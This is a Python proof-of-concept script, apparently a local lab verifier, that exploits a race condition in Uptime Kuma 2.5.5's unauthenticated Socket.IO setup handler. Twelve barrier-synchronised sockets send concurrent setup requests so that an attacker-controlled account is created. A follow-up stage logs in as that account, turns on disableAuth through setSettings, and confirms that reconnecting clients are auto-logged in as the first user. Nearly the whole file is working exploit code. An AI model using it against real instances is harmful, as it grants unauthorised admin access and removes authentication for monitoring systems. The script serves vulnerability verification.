#!/usr/bin/env python3
"""Local oracle: Uptime Kuma 2.5.5 concurrent unauthenticated Socket.IO setup TOCTOU.

Already-connected clients barrier-emit setup. bcryptjs.hash is nextTick-sync, so
COUNT=0 is shared only if packets land in the same poll. Username UNIQUE only.
Witness username UK-SETUP-TOCTOU-WITNESS. Sequential late setup must be rejected.
Bonus: attacker login → setSettings(disableAuth) → reconnect auto-login is id 1.
Loopback only. No shells.
"""
from __future__ import annotations

import os
import subprocess
import sys
import threading
import time
from dataclasses import dataclass

import socketio

LABEL = "uptime-kuma-setup-toctou"
WITNESS = "UK-SETUP-TOCTOU-WITNESS"
IMAGE = "louislam/uptime-kuma:2.5.5"
DEFAULT_BASE = "http://127.0.0.1:18141"
DEFAULT_COMPOSE_PROJECT = "uptime-kuma-setup-toctou"
DEFAULT_SERVICE = "kuma"
DB_PATH = "/app/data/kuma.db"
SOCKETIO_PATH = "socket.io"
USER_SQL = "SELECT id, username FROM user ORDER BY id;"

OPERATOR = "labadmin"
OPERATOR_PW = "LabAdmin-Passw0rd-OK"
ATTACKER = WITNESS
ATTACKER_PW = "Attacker-Passw0rd-OK"
LATE_USER = "uk-late-setup"
LATE_PW = "LateSetup-Passw0rd-OK"

# N>=8 already-connected sockets. Mix operator and attacker only so id 1
# is one of those two (needed for disableAuth auto-login identity).
N_OPERATOR = 6
N_ATTACKER = 6
N_EXTRA = 0

CONNECT_TIMEOUT_S = 30.0
LOGIN_WAIT_S = 15.0
SETUP_ACK_TIMEOUT_S = 60.0
LATE_ACK_TIMEOUT_S = 30.0
BARRIER_WAIT_S = 30.0
THREAD_JOIN_S = 90.0
COMPOSE_TIMEOUT_S = 30.0
RACE_SETTLE_S = 0.5
BONUS_SETTLE_S = 0.3
AUTOLOGIN_WAIT_S = 20.0
BONUS_ACK_TIMEOUT_S = 30.0


@dataclass(frozen=True)
class Config:
    base: str
    compose_project: str
    service: str


def _config_from_argv(argv: list[str]) -> Config:
    base = (argv[1] if len(argv) > 1 else DEFAULT_BASE).rstrip("/")
    return Config(
        base=base,
        compose_project=os.environ.get("COMPOSE_PROJECT_NAME", DEFAULT_COMPOSE_PROJECT),
        service=os.environ.get("LAB_SERVICE", DEFAULT_SERVICE),
    )


def fail(reason: str) -> int:
    print(f"FAIL {LABEL}")
    print(f"IOC reason={reason}")
    return 1


def _ack_ok(ack: object) -> bool:
    return isinstance(ack, dict) and bool(ack.get("ok"))


class KumaSock:
    def __init__(self, url: str) -> None:
        self.url = url
        self.sio = socketio.Client(
            reconnection=False,
            logger=False,
            engineio_logger=False,
            handle_sigint=False,
        )
        self.login_required = threading.Event()
        self.auto_login = threading.Event()
        self.info: object | None = None
        self.monitor_list: object | None = None

        @self.sio.on("loginRequired")
        def _lr(*_a: object) -> None:
            self.login_required.set()

        @self.sio.on("autoLogin")
        def _al(*_a: object) -> None:
            self.auto_login.set()

        @self.sio.on("info")
        def _info(info: object) -> None:
            self.info = info

        @self.sio.on("setup")
        def _setup(*_a: object) -> None:
            pass

        @self.sio.on("monitorList")
        def _ml(data: object) -> None:
            self.monitor_list = data

    def connect(self, wait_login: bool = True) -> bool:
        # Do not set Origin: websocket-client already sends it from the URL.
        # A duplicate/mismatched Origin is 400 Forbidden (server.js origin check).
        self.sio.connect(
            self.url,
            transports=["websocket"],
            wait_timeout=CONNECT_TIMEOUT_S,
            socketio_path=SOCKETIO_PATH,
        )
        if wait_login:
            self.login_required.wait(timeout=LOGIN_WAIT_S)
        return bool(self.sio.connected)

    def emit_ack(
        self,
        event: str,
        data: object | None = None,
        timeout: float = SETUP_ACK_TIMEOUT_S,
    ) -> object:
        box: dict[str, tuple[object, ...]] = {}
        done = threading.Event()

        def _cb(*args: object) -> None:
            box["args"] = args
            done.set()

        self.sio.emit(event, data, callback=_cb)
        if not done.wait(timeout):
            return {"_timeout": True}
        args = box.get("args") or ()
        if not args:
            return None
        if len(args) == 1:
            return args[0]
        return list(args)

    def disconnect(self) -> None:
        try:
            if self.sio.connected:
                self.sio.disconnect()
        except (OSError, RuntimeError, socketio.exceptions.ConnectionError):
            pass


def compose_exec(cfg: Config, *args: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", cfg.compose_project, "exec", "-T", cfg.service, *args],
        capture_output=True,
        text=True,
        timeout=COMPOSE_TIMEOUT_S,
        check=False,
    )


def oracle_users(cfg: Config) -> list[tuple[str, str]]:
    proc = compose_exec(
        cfg,
        "sqlite3",
        "-separator",
        "|",
        DB_PATH,
        USER_SQL,
    )
    raw = (proc.stdout or "") + (proc.stderr or "")
    print(f"IOC oracle-sqlite rc={proc.returncode} stdout={proc.stdout!r} stderr={proc.stderr!r}")
    rows: list[tuple[str, str]] = []
    if proc.returncode != 0:
        return rows
    for line in raw.splitlines():
        line = line.strip()
        if not line or "|" not in line:
            continue
        uid, name = line.split("|", 1)
        rows.append((uid.strip(), name.strip()))
    return rows


def oracle_setting(cfg: Config, key: str) -> str:
    proc = compose_exec(
        cfg,
        "sqlite3",
        DB_PATH,
        f"SELECT value FROM setting WHERE key = '{key}';",
    )
    val = (proc.stdout or "").strip()
    print(f"IOC setting key={key} rc={proc.returncode} value={val!r}")
    return val


def race_usernames() -> list[tuple[str, str]]:
    users: list[tuple[str, str]] = []
    users.extend([(OPERATOR, OPERATOR_PW)] * N_OPERATOR)
    users.extend([(ATTACKER, ATTACKER_PW)] * N_ATTACKER)
    for i in range(2, 2 + N_EXTRA):
        users.append((f"ukrace{i}", f"UkRace{i}-Passw0rd-OK"))
    return users


def run_race(cfg: Config) -> tuple[list[object | None], list[tuple[str, str]]]:
    users = race_usernames()
    n = len(users)
    print(f"IOC race-n={n} operator={OPERATOR} attacker={ATTACKER}")
    barrier = threading.Barrier(n)
    acks: list[object | None] = [None] * n
    errors: list[str | None] = [None] * n

    def worker(idx: int, username: str, password: str) -> None:
        sock: KumaSock | None = None
        try:
            sock = KumaSock(cfg.base)
            if not sock.connect():
                errors[idx] = "connect-failed"
                barrier.abort()
                return
            try:
                barrier.wait(timeout=BARRIER_WAIT_S)
            except threading.BrokenBarrierError:
                errors[idx] = "barrier-broken"
                return
            acks[idx] = sock.emit_ack("setup", (username, password), timeout=SETUP_ACK_TIMEOUT_S)
        except Exception as exc:
            errors[idx] = f"{type(exc).__name__}:{exc}"
            barrier.abort()
        finally:
            if sock is not None:
                sock.disconnect()

    threads = [
        threading.Thread(target=worker, args=(i, u, p), daemon=True)
        for i, (u, p) in enumerate(users)
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=THREAD_JOIN_S)

    for i, (u, _p) in enumerate(users):
        print(f"IOC setup-ack i={i} user={u} ack={acks[i]!r} err={errors[i]!r}")

    time.sleep(RACE_SETTLE_S)
    rows = oracle_users(cfg)
    print(f"IOC user-rows {rows}")
    return acks, rows


def sequential_late_setup(cfg: Config) -> dict[str, object] | None:
    sock = KumaSock(cfg.base)
    try:
        sock.connect()
        ack = sock.emit_ack("setup", (LATE_USER, LATE_PW), timeout=LATE_ACK_TIMEOUT_S)
        print(f"IOC sequential-late-setup ack={ack!r}")
        if isinstance(ack, dict):
            return ack
        return {"raw": ack}
    finally:
        sock.disconnect()


def password_for(username: str) -> str | None:
    if username == OPERATOR:
        return OPERATOR_PW
    if username == ATTACKER:
        return ATTACKER_PW
    if username.startswith("ukrace"):
        suffix = username[len("ukrace") :]
        return f"UkRace{suffix}-Passw0rd-OK"
    return None


def bonus_disable_auth(cfg: Config, rows: list[tuple[str, str]]) -> None:
    id1_name = next((name for uid, name in rows if str(uid) == "1"), None)
    attacker_id = next((uid for uid, name in rows if name == ATTACKER), None)
    print(f"IOC bonus-id1={id1_name!r} attacker-id={attacker_id!r}")

    sock = KumaSock(cfg.base)
    try:
        sock.connect()
        login_ack = sock.emit_ack(
            "login",
            {"username": ATTACKER, "password": ATTACKER_PW},
            timeout=BONUS_ACK_TIMEOUT_S,
        )
        print(f"IOC attacker-login ack={login_ack!r}")
        if not _ack_ok(login_ack):
            print("IOC bonus-skip attacker login failed")
            return
        settings_ack = sock.emit_ack("getSettings", timeout=BONUS_ACK_TIMEOUT_S)
        print(f"IOC getSettings ack={settings_ack!r}")
        if not _ack_ok(settings_ack) or not isinstance(settings_ack, dict):
            print("IOC bonus-skip getSettings failed")
            return
        data = dict(settings_ack.get("data") or {})
        data["disableAuth"] = True
        set_ack = sock.emit_ack("setSettings", (data, ATTACKER_PW), timeout=BONUS_ACK_TIMEOUT_S)
        print(f"IOC setSettings-disableAuth ack={set_ack!r}")
        if not _ack_ok(set_ack):
            print("IOC bonus-skip setSettings failed")
            return
    finally:
        sock.disconnect()

    time.sleep(BONUS_SETTLE_S)
    disable_val = oracle_setting(cfg, "disableAuth")

    recon = KumaSock(cfg.base)
    try:
        recon.connect(wait_login=False)
        got_auto = recon.auto_login.wait(timeout=AUTOLOGIN_WAIT_S)
        got_login_req = recon.login_required.is_set()
        print(
            f"IOC reconnect autoLogin={got_auto} loginRequired={got_login_req} "
            f"disableAuth={disable_val}"
        )
        # Identity: prepare2FA doubleCheckPassword uses socket.userID (id 1).
        atk_pw_ack = recon.emit_ack("prepare2FA", ATTACKER_PW, timeout=BONUS_ACK_TIMEOUT_S)
        print(f"IOC prepare2FA-attacker-pw ack={atk_pw_ack!r}")
        id1_pw = password_for(id1_name or "")
        id1_pw_ack: object | None = None
        if id1_pw and id1_pw != ATTACKER_PW:
            id1_pw_ack = recon.emit_ack("prepare2FA", id1_pw, timeout=BONUS_ACK_TIMEOUT_S)
            print(f"IOC prepare2FA-id1-pw user={id1_name} ack={id1_pw_ack!r}")
        elif id1_name == ATTACKER:
            print(
                "IOC prepare2FA-id1-pw skipped "
                "(id 1 is attacker; attacker-pw ack is the identity)"
            )
            id1_pw_ack = atk_pw_ack
        uri = ""
        if isinstance(id1_pw_ack, dict):
            uri = str(id1_pw_ack.get("uri") or "")
        auto_is_id1 = got_auto and bool(id1_name) and id1_name in uri
        auto_not_attacker = ATTACKER not in uri
        auto_is_operator = auto_is_id1 and id1_name == OPERATOR and auto_not_attacker
        print(
            f"IOC bonus-autologin-identity operator={auto_is_operator} "
            f"id1={id1_name} auto_is_id1={auto_is_id1} not_attacker={auto_not_attacker} "
            f"uri={uri!r}"
        )
    finally:
        recon.disconnect()


def main() -> int:
    cfg = _config_from_argv(sys.argv)
    print(f"IOC base={cfg.base} project={cfg.compose_project} image={IMAGE}")
    _acks, rows = run_race(cfg)
    names = [name for _uid, name in rows]
    count = len(rows)
    witness = ATTACKER in names
    print(f"IOC race-count={count} witness={witness} names={names}")

    if count < 2 or not witness:
        print(f"RETRY {LABEL}")
        return 2

    late = sequential_late_setup(cfg)
    late_msg = str((late or {}).get("msg") or "")
    late_ok = (late or {}).get("ok")
    initialized = late_ok is False and "initialized" in late_msg.lower()
    print(f"IOC sequential-initialized={initialized} msg={late_msg!r}")
    if not initialized:
        return fail("late setup was not rejected (not a closed race window)")

    try:
        bonus_disable_auth(cfg, rows)
    except Exception as exc:
        print(f"IOC bonus-error {type(exc).__name__}:{exc}")

    print(f"IOC user-rows-final {oracle_users(cfg)}")
    print(f"SUCCESS {LABEL}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
